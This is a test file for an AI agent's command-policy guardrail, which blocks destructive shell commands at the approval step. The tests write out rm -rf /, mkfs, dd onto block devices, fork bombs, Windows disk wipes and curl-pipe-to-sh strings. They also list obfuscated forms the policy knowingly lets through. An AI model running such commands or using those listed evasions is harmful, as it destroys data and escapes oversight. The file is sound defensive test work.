import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import {
  evaluateCommandPolicy,
  vetoForToolCall,
  withCommandPolicy,
} from "../src/internal/command-policy.js";
import { DEFAULT_COMMAND_POLICY_RULES } from "../src/state/command-policy-defaults.js";
import { Session } from "../src/session.js";
import { assistantText, toolCall, userText } from "../src/omnimessage/index.js";
import type { OmniMessage, SessionMetaPayload } from "../src/omnimessage/index.js";
import type {
  ApproveFn,
  CommandPolicyConfig,
  EnvironmentInterface,
  LLMInterface,
  LLMOutcome,
} from "../src/interfaces.js";

/** Shorthand: the matched rule name, or null. */
function hit(cmd: string, policy?: CommandPolicyConfig): string | null {
  return evaluateCommandPolicy(cmd, policy)?.rule ?? null;
}

describe("command policy factory rules", () => {
  it("catches rm with recursive+force in every spelling", () => {
    for (const cmd of [
      "rm -rf /tmp/x",
      "rm -fr node_modules",
      "rm -r -f build",
      "rm -f -r build",
      "rm -Rf ./dist",
      "rm --recursive --force data",
      "rm --force --recursive data",
      "sudo rm -rf /",
      "cd / && rm -rf home",
      "rm -rfv cache",
      "rm  -rf   spaced", // whitespace runs normalize before matching
      "rm foo -rf", // GNU rm accepts flags after operands
      "rm -rF caps", // recursive already accepted -R; force now accepts -F too
      "/bin/rm -rf /tmp/x", // reached by path: an ordinary spelling, not obfuscation
      "sudo /usr/bin/rm -rf /tmp/x",
      "echo hi; rm -rf /tmp/x", // a second command after a separator is its own segment
    ]) {
      expect(hit(cmd), cmd).toBe("rm-recursive-force");
    }
  });

  it("leaves benign rm and lookalikes alone", () => {
    for (const cmd of [
      "rm -r build", // recursive without force
      "rm -f single-file", // force without recursive
      "rm plain.txt",
      "npm rm -g pkg", // npm's rm subcommand carries no recursive+force pair here
      "grep -rf patterns.txt . | head", // -rf flag on a command that is not rm
      "firmware-tool --reflash", // "rm" only as a substring of another word
      "/opt/bin/confirm -rf x", // a path whose last segment merely ends in "rm"
    ]) {
      expect(hit(cmd), cmd).toBeNull();
    }
  });

  it("catches mkfs including dotted variants, not lookalikes", () => {
    expect(hit("mkfs /dev/sdb1")).toBe("mkfs");
    expect(hit("sudo mkfs.ext4 /dev/sdb1")).toBe("mkfs");
    // mkfs usually lives in /sbin, so the path spelling is the common one.
    expect(hit("/sbin/mkfs.ext4 /dev/sda1")).toBe("mkfs");
    expect(hit("man mkfs")).toBe("mkfs"); // guardrail accepts this false positive: the word is the risk signal
    expect(hit("mkfsomething else")).toBeNull();
  });

  it("catches dd onto block devices but allows /dev/null and file targets", () => {
    expect(hit("dd if=/dev/zero of=/dev/sda bs=1M")).toBe("dd-to-block-device");
    expect(hit("sudo dd if=img.iso of=/dev/nvme0n1")).toBe("dd-to-block-device");
    expect(hit("dd if=/dev/rdisk2 of=/dev/rdisk3")).toBe("dd-to-block-device");
    expect(hit("dd if=/dev/zero of=/dev/null bs=1M count=1")).toBeNull();
    expect(hit("dd if=in.bin of=out.bin")).toBeNull();
    // Quoting the target, or continuing past it, is the same write.
    expect(hit('dd if=/dev/zero of="/dev/sda"')).toBe("dd-to-block-device");
    expect(hit("dd if=/dev/zero of=/dev/sda; sync")).toBe("dd-to-block-device");
    expect(hit("/bin/dd if=/dev/zero of=/dev/sda")).toBe("dd-to-block-device");
  });

  it("catches the classic fork bomb", () => {
    expect(hit(":(){ :|:& };:")).toBe("fork-bomb");
    expect(hit(": ( ) { : | : & } ; :")).toBe("fork-bomb");
  });

  it("catches redirection onto block devices but allows /dev/null", () => {
    expect(hit("echo x > /dev/sda")).toBe("overwrite-block-device");
    expect(hit("cat img >/dev/mmcblk0")).toBe("overwrite-block-device");
    expect(hit("echo x > /dev/null")).toBeNull();
    expect(hit("echo x 2>/dev/null")).toBeNull();
    expect(hit("echo x > '/dev/sda'")).toBe("overwrite-block-device");
    expect(hit("echo x > /dev/sda; echo done")).toBe("overwrite-block-device");
  });
});

describe("command policy normalization (plain spellings, not evasion)", () => {
  it("sees through quoting and backslash escapes of the command word", () => {
    for (const cmd of [
      '"rm" -rf /',
      "'rm' -rf /",
      "r''m -rf /",
      "\\rm -rf /",
      "rm -r''f /",
      'rm "-rf" /',
    ]) {
      expect(hit(cmd), cmd).toBe("rm-recursive-force");
    }
  });

  it("sees into a literal sh -c payload, whichever shell and whichever rule", () => {
    expect(hit("sh -c 'rm -rf /'")).toBe("rm-recursive-force");
    expect(hit('bash -c "rm -rf /"')).toBe("rm-recursive-force");
    expect(hit("sudo sh -c 'rm -rf /etc'")).toBe("rm-recursive-force");
    expect(hit("sh -c 'mkfs.ext4 /dev/sda1'")).toBe("mkfs");
    expect(hit('zsh -c "dd if=/dev/zero of=/dev/sda"')).toBe("dd-to-block-device");
  });

  it("a leading wrapper was always covered — the anchor accepts any separator", () => {
    for (const cmd of [
      "sudo rm -rf /",
      "env rm -rf /",
      "env -i rm -rf /",
      "command rm -rf /",
      "nice rm -rf /",
      "nohup rm -rf /",
      "xargs rm -rf",
    ]) {
      expect(hit(cmd), cmd).toBe("rm-recursive-force");
    }
  });

  it("does NOT see a command computed at run time — the documented boundary", () => {
    // Normalization removes quoting; it does not expand a variable, run a substitution, or
    // decode anything. These stay unmatched on purpose: shell is a programming language, and
    // patterns that pretend to read one buy the appearance of coverage. If a rule is ever
    // added that makes one of these match, that is a claim to re-examine, not a win.
    for (const cmd of [
      "rm -rf$IFS/tmp",
      "rm${IFS}-rf${IFS}/",
      "X=rm; $X -rf /",
      "R=-rf; rm $R /",
      "$(echo rm) -rf /",
      "eval $CMD",
      "echo cm0gLXJmIC8= | base64 -d | sh",
      "curl -s http://x/i.sh | sh",
      "python -c \"import shutil; shutil.rmtree('/')\"",
    ]) {
      expect(hit(cmd), cmd).toBeNull();
    }
  });
});

describe("command policy Windows counterparts", () => {
  it("catches recursive force deletes in pwsh and cmd, case-insensitively", () => {
    for (const cmd of [
      "Remove-Item -Recurse -Force C:\\Data",
      "remove-item -r -f .",
      "Remove-Item -Path X -Recurse -Force",
      "rd /s /q C:\\",
      "RD /S /Q C:\\",
      "rd /s/q C:\\", // cmd lets switches run together
      "rmdir /s /q dir",
      "del /f /s /q C:\\*",
    ]) {
      expect(hit(cmd), cmd).toBe("windows-recursive-delete");
    }
    // The recursive+quiet pair is required, exactly as the POSIX rule requires recursive+force.
    expect(hit("rmdir empty")).toBeNull();
    expect(hit("del one.txt")).toBeNull();
  });

  it("catches a volume format but not the word 'format'", () => {
    expect(hit("format C: /q")).toBe("windows-format-volume");
    expect(hit("FORMAT D:")).toBe("windows-format-volume");
    expect(hit("Format-Volume -DriveLetter C")).toBe("windows-format-volume");
    // The drive letter is what makes it a format; these are everyday build commands.
    expect(hit("pnpm format")).toBeNull();
    expect(hit("pnpm format:check")).toBeNull();
    expect(hit("npm run format && npm test")).toBeNull();
  });

  it("catches a raw disk overwrite and the cmd fork bomb", () => {
    expect(hit("dd if=x of=\\\\.\\PhysicalDrive0")).toBe("windows-disk-overwrite");
    expect(hit("Get-Content x > \\\\.\\PhysicalDrive1")).toBe("windows-disk-overwrite");
    expect(hit("Clear-Disk -Number 0 -RemoveData")).toBe("windows-disk-overwrite");
    expect(hit("%0|%0")).toBe("windows-fork-bomb");
    expect(hit("%0 | %0")).toBe("windows-fork-bomb");
  });
});

describe("command policy config semantics", () => {
  it("factory set applies when no config or no rules list is given", () => {
    expect(hit("rm -rf /")).toBe("rm-recursive-force");
    expect(hit("rm -rf /", {})).toBe("rm-recursive-force");
  });

  it("enabled=false disables the whole policy", () => {
    const off: CommandPolicyConfig = {
      enabled: false,
      rules: [{ name: "no-curl", pattern: "\\bcurl\\b" }],
    };
    expect(hit("rm -rf /", off)).toBeNull();
    expect(hit("curl http://x", off)).toBeNull();
  });

  it("a stored rules list replaces the factory set entirely", () => {
    const policy: CommandPolicyConfig = {
      rules: [{ name: "no-force-push", pattern: "git push [^;|&]*--force" }],
    };
    expect(hit("git push origin main --force", policy)).toBe("no-force-push");
    // The factory rules are data, not code: a list without them does not match rm -rf.
    expect(hit("rm -rf /", policy)).toBeNull();
    expect(hit("git push origin main", policy)).toBeNull();
    // A stored empty list means no rules at all.
    expect(hit("rm -rf /", { rules: [] })).toBeNull();
  });

  it("a rule with enabled=false is skipped; the others still fire", () => {
    const policy: CommandPolicyConfig = {
      rules: DEFAULT_COMMAND_POLICY_RULES.map((r) =>
        r.name === "rm-recursive-force" ? { ...r, enabled: false } : { ...r },
      ),
    };
    expect(hit("rm -rf node_modules", policy)).toBeNull();
    expect(hit("mkfs /dev/sdb1", policy)).toBe("mkfs");
  });

  it("skips an uncompilable rule instead of failing the whole policy", () => {
    const policy: CommandPolicyConfig = {
      rules: [
        { name: "broken", pattern: "(" },
        { name: "no-curl", pattern: "\\bcurl\\b" },
      ],
    };
    expect(hit("curl http://x", policy)).toBe("no-curl");
  });

  it("a hit reports the matched rule's name", () => {
    const veto = evaluateCommandPolicy("rm -rf /");
    expect(veto).not.toBeNull();
    expect(veto?.rule).toBe("rm-recursive-force");
  });
});

describe("vetoForToolCall", () => {
  const json = (args: unknown) => JSON.stringify(args);

  it("evaluates both tools that reach a shell, each on its own argument", () => {
    expect(vetoForToolCall("exec_command", json({ cmd: "rm -rf /" }))?.rule).toBe(
      "rm-recursive-force",
    );
    expect(vetoForToolCall("exec_command", json({ cmd: "ls" }))).toBeNull();
    // Typing into an already-running shell is the same reach: `exec_command {cmd:"bash"}`
    // matches nothing, so guarding only the launch left the guardrail one launch deep.
    expect(
      vetoForToolCall("input_command", json({ process_id: "p1", chars: "rm -rf /\n" }))?.rule,
    ).toBe("rm-recursive-force");
    expect(vetoForToolCall("input_command", json({ process_id: "p1", chars: "yes\n" }))).toBeNull();
    // Other tools carry no shell text; even a same-shaped argument is not evaluated. An MCP
    // server's shell is a different surface this policy deliberately does not reach into.
    expect(vetoForToolCall("write_file", json({ cmd: "rm -rf /" }))).toBeNull();
    expect(vetoForToolCall("mcp__server__shell", json({ cmd: "rm -rf /" }))).toBeNull();
  });

  it("exempts the lone Ctrl-C, which the tool turns into SIGINT rather than typed text", () => {
    const interrupt = String.fromCharCode(3);
    expect(
      vetoForToolCall("input_command", json({ process_id: "p1", chars: interrupt })),
    ).toBeNull();
  });

  it("treats malformed arguments as the tool's own validation problem, not a hit", () => {
    expect(vetoForToolCall("exec_command", json({}))).toBeNull();
    expect(vetoForToolCall("exec_command", json({ cmd: 42 }))).toBeNull();
    expect(vetoForToolCall("input_command", json({ process_id: "p1" }))).toBeNull();
    expect(vetoForToolCall("input_command", json({ process_id: "p1", chars: "" }))).toBeNull();
    expect(vetoForToolCall("exec_command", "not json at all")).toBeNull();
    expect(vetoForToolCall("exec_command", json([1, 2, 3]))).toBeNull();
    expect(vetoForToolCall("exec_command", json(null))).toBeNull();
  });
});

describe("factory rule metadata", () => {
  it("every factory rule compiles and carries a description", () => {
    for (const rule of DEFAULT_COMMAND_POLICY_RULES) {
      expect(() => new RegExp(rule.pattern)).not.toThrow();
      expect(rule.description?.length ?? 0).toBeGreaterThan(0);
    }
  });
});

describe("withCommandPolicy (the approval-boundary wrapper)", () => {
  const call = (cmd: string, name = "exec_command"): OmniMessage =>
    toolCall({ name, arguments: JSON.stringify({ cmd }), toolCallId: "c1" });

  it("refuses a vetoed call without consulting the wrapped callback", async () => {
    let asked = 0;
    const guarded = withCommandPolicy(async () => {
      asked += 1;
      return "allow";
    });

    const outcome = await guarded(call("rm -rf /tmp/x") as never);

    // The host is never asked: that is what makes the policy outrank every approval mode.
    expect(asked).toBe(0);
    // "forbidden" is the whole answer; the engine renders the fixed denial line from it.
    expect(outcome).toBe("forbidden");
  });

  it("passes everything else straight through, decision included", async () => {
    const guarded = withCommandPolicy(async () => "allow");
    expect(await guarded(call("ls -la") as never)).toBe("allow");
    // A non-exec tool is not the policy's business, even with a command-shaped argument.
    expect(await guarded(call("rm -rf /", "write_file") as never)).toBe("allow");

    const denying = withCommandPolicy(async () => "deny");
    expect(await denying(call("ls") as never)).toBe("deny");
  });

  it("refuses typed keystrokes too, so a launched shell is not a way around it", async () => {
    let asked = 0;
    const guarded = withCommandPolicy(async () => {
      asked += 1;
      return "allow";
    });
    const typed = (chars: string): OmniMessage =>
      toolCall({
        name: "input_command",
        arguments: JSON.stringify({ process_id: "p1", chars }),
        toolCallId: "c2",
      });

    expect(await guarded(typed("rm -rf /\n") as never)).toBe("forbidden");
    expect(asked).toBe(0);
    expect(await guarded(typed("make build\n") as never)).toBe("allow");
    expect(asked).toBe(1);
  });

  it("a disabled policy delegates every call, vetoed or not", async () => {
    const guarded = withCommandPolicy(async () => "allow", { enabled: false });
    expect(await guarded(call("rm -rf /") as never)).toBe("allow");
  });
});

describe("Session applies the policy at the approval boundary", () => {
  let tmp: string;
  beforeEach(async () => {
    tmp = await mkdtemp(path.join(tmpdir(), "penguin-cmdpolicy-"));
  });
  afterEach(async () => {
    await rm(tmp, { recursive: true, force: true });
  });

  const meta = (): SessionMetaPayload => ({
    session_id: "session-1",
    provider: "custom",
    model_id: "m1",
    model_context_window: 1000,
    system_prompt: "sp",
    agent_state: tmp,
    workspace: tmp,
  });

  it("denies a vetoed command under allow-all, and the tool never reaches the Environment", async () => {
    let approveCalls = 0;
    let executed = 0;
    let secondInput: OmniMessage[] | null = null;
    let turn = 0;
    const llm: LLMInterface = {
      async *streamGenerate(params): AsyncGenerator<OmniMessage, LLMOutcome> {
        if (turn++ === 0) {
          yield toolCall({
            name: "exec_command",
            arguments: JSON.stringify({ cmd: "rm -rf /tmp/definitely-not-run" }),
            toolCallId: "call_veto",
            stopReason: "completed",
          });
          return { status: "completed" };
        }
        secondInput = params.newMessages;
        yield assistantText("Understood, choosing another approach.");
        return { status: "completed" };
      },
    };
    const environment: EnvironmentInterface = {
      listTools: async () => [],
      // eslint-disable-next-line require-yield
      executeTool: async function* () {
        executed += 1;
        throw new Error("a vetoed command must never be executed");
      },
      toolPermission: () => undefined,
    };
    const allowAll: ApproveFn = async () => {
      approveCalls += 1;
      return "allow";
    };
    // No commandPolicy in the config: the factory rule set applies, on.
    const session = new Session({
      meta: meta(),
      bootstrap: async () => ({ tools: [], llm, mcp: [] }),
      mcpServers: [],
      environment,
      imagesDir: path.join(tmp, "images"),
      modelHasVision: true,
    });

    const all: OmniMessage[] = [];
    for await (const msg of session.run([userText("clean up")], { approve: allowAll })) {
      all.push(msg);
    }

    expect(approveCalls).toBe(0);
    expect(executed).toBe(0);
    const decision = all.find(
      (m) => (m.payload as { type?: string }).type === "approval_decision",
    )!;
    // The decision value itself separates a policy veto from a human denial in the Trace.
    expect((decision.payload as { decision?: string }).decision).toBe("forbidden");
    // The denial is the fixed line: "by policy" (not "by user") is what tells the model to
    // change course instead of treating it as a person's cancellation; both read `aborted`.
    const output = all.find((m) => (m.payload as { type?: string }).type === "tool_call_output")!;
    expect((output.payload as { stop_reason?: string }).stop_reason).toBe("aborted");
    expect((output.payload as { output: string }).output).toBe("Tool call denied by policy.");
    // The denial is fed back to the model, so the next turn can route around it.
    expect(
      (secondInput as OmniMessage[] | null)?.some(
        (m) => (m.payload as { type?: string }).type === "tool_call_output",
      ),
    ).toBe(true);
  });

  it("a project policy switched off lets the same command through to execution", async () => {
    let approveCalls = 0;
    let executedCmd: string | null = null;
    let turn = 0;
    const llm: LLMInterface = {
      async *streamGenerate(): AsyncGenerator<OmniMessage, LLMOutcome> {
        if (turn++ === 0) {
          yield toolCall({
            name: "exec_command",
            arguments: JSON.stringify({ cmd: "rm -rf ./build" }),
            toolCallId: "call_ok",
            stopReason: "completed",
          });
          return { status: "completed" };
        }
        yield assistantText("done");
        return { status: "completed" };
      },
    };
    const environment: EnvironmentInterface = {
      listTools: async () => [],
      async *executeTool(request) {
        const args = JSON.parse(request.toolCall.payload.arguments) as { cmd: string };
        executedCmd = args.cmd;
        yield { type: "event", payload: { type: "noop" } } as unknown as OmniMessage;
      },
      toolPermission: () => undefined,
    };
    const session = new Session({
      meta: meta(),
      bootstrap: async () => ({ tools: [], llm, mcp: [] }),
      mcpServers: [],
      environment,
      imagesDir: path.join(tmp, "images"),
      modelHasVision: true,
      commandPolicy: { enabled: false },
    });

    for await (const _ of session.run([userText("clean up")], {
      approve: async () => {
        approveCalls += 1;
        return "allow";
      },
    })) {
      // consume
    }

    expect(approveCalls).toBe(1);
    expect(executedCmd).toBe("rm -rf ./build");
  });
});
